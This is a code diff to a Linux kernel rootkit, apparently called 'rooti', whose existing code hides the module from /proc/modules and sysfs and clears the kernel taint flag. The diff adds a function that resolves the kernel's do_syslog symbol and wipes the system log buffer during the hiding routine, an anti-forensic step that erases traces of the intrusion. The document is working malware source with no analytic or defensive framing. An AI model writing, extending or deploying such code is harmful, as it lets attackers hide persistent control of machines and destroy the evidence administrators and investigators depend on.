@@ -1,7 +1,9 @@
 #include <linux/module.h>
 #include <linux/mutex.h>
 #include <linux/panic.h>
+#include <linux/syslog.h>
 #include "module.h"
+#include "../../config.h"
 #include "../../utils.h"
 
 static void rooti_hideme_from_procfs(void)
@@ -23,6 +25,13 @@ static int rooti_remove_taint(void)
     return 0;
 }
 
+static int rooti_clear_syslog(void)
+{
+    ROOTI_RESOLVE_FUNC_ADDR(do_syslog, -ENOENT, int, int, char *, int, int);
+
+    __do_syslog(SYSLOG_ACTION_CLEAR, NULL, 0, SYSLOG_FROM_PROC);
+    return 0;
+}
 
 /*
     Hides the rootkit from userspace by removing the entries from both procs (/proc/modules file)
@@ -33,13 +42,17 @@ int rooti_hideme(void)
     int err;
 
     ROOTI_RESOLVE_SYM_ADDR(struct mutex *, module_mutex, -ENOENT);
-
+    
     mutex_lock(__module_mutex);
     rooti_hideme_from_procfs();
     rooti_hideme_from_sysfs();
     mutex_unlock(__module_mutex);
 
     err = rooti_remove_taint();
+    if (err)
+        return err;
+
+    err = rooti_clear_syslog();
     if (err)
         return err;
 
